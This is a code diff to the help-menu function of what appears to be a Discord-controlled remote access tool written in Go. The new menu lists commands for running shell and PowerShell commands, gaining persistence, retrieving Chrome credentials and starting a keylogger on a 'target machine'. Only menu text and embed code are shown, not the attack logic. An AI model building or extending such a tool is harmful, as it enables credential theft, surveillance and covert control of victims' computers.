@@ -405,25 +405,22 @@ func helpCommand(s *discordgo.Session, channelID string) {
 		Description string
 	}{
 		// Slash commands
-		{"/run <command>", "Runs a command."},
-		{"/screenshot", "Takes a screenshot."},
-		{"/upload <file>", "Uploads a file."},
-		{"/download <path>", "Downloads the attached file."},
-		{"/shutdown", "Shuts down the bot."},
-		{"/help", "Displays this help menu."},
-		{"/location", "Fetches location data."},
-		{"/wallpaper <url>", "Changes wallpaper."},
-		{"/persistence", "Enables persistence."},
-		{"/list <path>", "Lists directory contents."},
-		{"/terminate", "Terminates the session."},
-		{"/process", "Lists running processes."},
-		// Emoji-based commands
-		{"🏃‍♂️ <command>", "Runs a command."},
-		{"📸", "Takes a screenshot."},
-		{"👇 <file>", "Uploads a file."},
-		{"☝️ <path>", "Downloads a file."},
-		{"💀", "Shuts down the bot."},
-		{"!help", "Displays this help menu."},
+		{"/cmd <command>", "Run a system command."},
+		{"/powershell <command>", "Run a PowerShell command."},
+		{"/help", "Displays the help menu."},
+		{"/download <file>", "Download a file from the server."},
+		{"/screenshot", "Take a screenshot of all displays and send it to the channel."},
+		{"/shutdown", "Shut down the bot."},
+		{"/location", "Get your current IP location."},
+		{"/cd <path>", "Change the working directory."},
+		{"/ls [path]", "List the contents of a directory."},
+		{"/process", "List all the processes running on the target machine."},
+		{"/persistent", "Make the agent persistent on the target machine."},
+		{"/creds", "Retrieve Chrome credentials on the target machine."},
+		{"/upload <url> <path>", "Upload a file from a URL to a specified path."},
+		{"/wallpaper <url>", "Change the wallpaper of the target machine."},
+		{"/keylogger start", "Start a keylogger on the target machine."},
+		{"/keylogger stop", "Stop the keylogger on the target machine."},
 	}
 
 	// Create an embed message
@@ -433,19 +430,17 @@ func helpCommand(s *discordgo.Session, channelID string) {
 		Color:       0x00ff00, // Set embed color (green)
 	}
 
-	// Build command lists
+	// Build command list
 	var commandList strings.Builder
 	for _, cmd := range commands {
 		commandList.WriteString(fmt.Sprintf("**%s** - %s\n", cmd.Command, cmd.Description))
 	}
 
-	// Check the length and adjust descriptions if necessary
-	combinedCommands := commandList.String()
-
+	// Add the commands to the embed
 	embed.Fields = []*discordgo.MessageEmbedField{
 		{
 			Name:   "Available Commands",
-			Value:  combinedCommands,
+			Value:  commandList.String(),
 			Inline: false,
 		},
 	}
